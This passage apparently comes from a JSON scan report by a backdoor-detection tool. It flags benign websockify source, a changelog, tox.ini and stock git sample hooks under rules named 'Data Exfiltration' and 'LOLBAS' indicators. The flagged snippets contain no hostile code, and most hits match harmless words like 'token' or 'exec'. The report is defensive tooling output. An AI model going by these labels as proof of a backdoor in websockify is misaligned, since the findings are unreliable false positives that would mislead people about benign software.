            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 31,
                  "endLine": 148,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n            # websockify listens (unless something between the client and\n            # websockify is redirecting traffic, but that's beside the point)\n            if token:\n",
                    "rendered": {
                      "text": "            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n            # websockify listens (unless something between the client and\n            # websockify is redirecting traffic, but that's beside the point)\n            if token:\n",
                      "markdown": "`            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n            # websockify listens (unless something between the client and\n            # websockify is redirecting traffic, but that's beside the point)\n            if token:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 18,
                  "endLine": 145,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        # in the form of token: host:port\n\n        if self.host_token:\n            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n",
                    "rendered": {
                      "text": "        # in the form of token: host:port\n\n        if self.host_token:\n            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n",
                      "markdown": "`        # in the form of token: host:port\n\n        if self.host_token:\n            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/CHANGES.txt"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 14,
                  "endLine": 39,
                  "endColumn": 22,
                  "snippet": {
                    "text": "* Can now log to syslog\n* Improved latency by disabling Nagle for proxied connection\n* Added client certificate authentication\n* Support for password protected certificate key file\n* TLS ciphers and options are now configurable\n* Can be invoked via inetd\n* Lots of minor fixes...\n",
                    "rendered": {
                      "text": "* Can now log to syslog\n* Improved latency by disabling Nagle for proxied connection\n* Added client certificate authentication\n* Support for password protected certificate key file\n* TLS ciphers and options are now configurable\n* Can be invoked via inetd\n* Lots of minor fixes...\n",
                      "markdown": "`* Can now log to syslog\n* Improved latency by disabling Nagle for proxied connection\n* Added client certificate authentication\n* Support for password protected certificate key file\n* TLS ciphers and options are now configurable\n* Can be invoked via inetd\n* Lots of minor fixes...\n`"
                    }
                  },
                  "sourceLanguage": "plaintext"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/CHANGES.txt"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 21,
                  "endLine": 65,
                  "endColumn": 46,
                  "snippet": {
                    "text": "* Support heartbeats (via PING) and automatic responses to PONG (#169)\n* Automatically reject unmasked client frames by default (strict mode) (#174)\n* Automatically restart interrupted select calls (#175)\n* Make 'run' respect environment settings (including virtualenv) (#176)\n\n0.6.1 - May 11, 2015\n--------------------\n",
                    "rendered": {
                      "text": "* Support heartbeats (via PING) and automatic responses to PONG (#169)\n* Automatically reject unmasked client frames by default (strict mode) (#174)\n* Automatically restart interrupted select calls (#175)\n* Make 'run' respect environment settings (including virtualenv) (#176)\n\n0.6.1 - May 11, 2015\n--------------------\n",
                      "markdown": "`* Support heartbeats (via PING) and automatic responses to PONG (#169)\n* Automatically reject unmasked client frames by default (strict mode) (#174)\n* Automatically restart interrupted select calls (#175)\n* Make 'run' respect environment settings (including virtualenv) (#176)\n\n0.6.1 - May 11, 2015\n--------------------\n`"
                    }
                  },
                  "sourceLanguage": "plaintext"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tox.ini"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 1,
                  "endLine": 13,
                  "endColumn": 5,
                  "snippet": {
                    "text": "commands = nosetests {posargs}\ndeps = -r{toxinidir}/test-requirements.txt\n\n# At some point we should enable this since tox expects it to exist but\n# the code will need pep8ising first.\n#[testenv:pep8]\n#commands = flake8\n",
                    "rendered": {
                      "text": "commands = nosetests {posargs}\ndeps = -r{toxinidir}/test-requirements.txt\n\n# At some point we should enable this since tox expects it to exist but\n# the code will need pep8ising first.\n#[testenv:pep8]\n#commands = flake8\n",
                      "markdown": "`commands = nosetests {posargs}\ndeps = -r{toxinidir}/test-requirements.txt\n\n# At some point we should enable this since tox expects it to exist but\n# the code will need pep8ising first.\n#[testenv:pep8]\n#commands = flake8\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 45,
                  "endLine": 13,
                  "endColumn": 53,
                  "snippet": {
                    "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                    "rendered": {
                      "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                      "markdown": "`#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 51,
                  "endLine": 12,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                    "rendered": {
                      "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                      "markdown": "`# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 53,
                  "endLine": 11,
                  "endColumn": 61,
                  "snippet": {
                    "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                    "rendered": {
                      "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                      "markdown": "`# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 15,
                  "endLine": 143,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                    "rendered": {
                      "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                      "markdown": "`\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 49,
                  "endLine": 141,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                    "rendered": {
                      "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                      "markdown": "`\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 30,
                  "endLine": 129,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                    "rendered": {
                      "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                      "markdown": "`\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 28,
                  "endLine": 128,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                    "rendered": {
                      "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                      "markdown": "`\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 30,
                  "endLine": 110,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                    "rendered": {
                      "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                      "markdown": "`\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 45,
                  "endLine": 8,
                  "endColumn": 50,
                  "snippet": {
                    "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                    "rendered": {
                      "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                      "markdown": "`use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17,
                  "endLine": 7,
                  "endColumn": 25,
                  "snippet": {
                    "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                    "rendered": {
                      "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                      "markdown": "`use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 4,
                  "endLine": 8,
                  "endColumn": 9,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 24,
                  "endLine": 26,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                    "rendered": {
                      "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                      "markdown": "`\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 4,
                  "endLine": 49,
                  "endColumn": 9,
                  "snippet": {
                    "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                    "rendered": {
                      "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                      "markdown": "`fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 1,
                  "endLine": 43,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                    "rendered": {
                      "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                      "markdown": "`\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                    "rendered": {
                      "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                      "markdown": "`\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 11,
                  "endLine": 31,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                    "rendered": {
                      "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                      "markdown": "`\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 18,
                  "endLine": 14,
                  "endColumn": 24,
                  "snippet": {
                    "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                    "rendered": {
                      "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
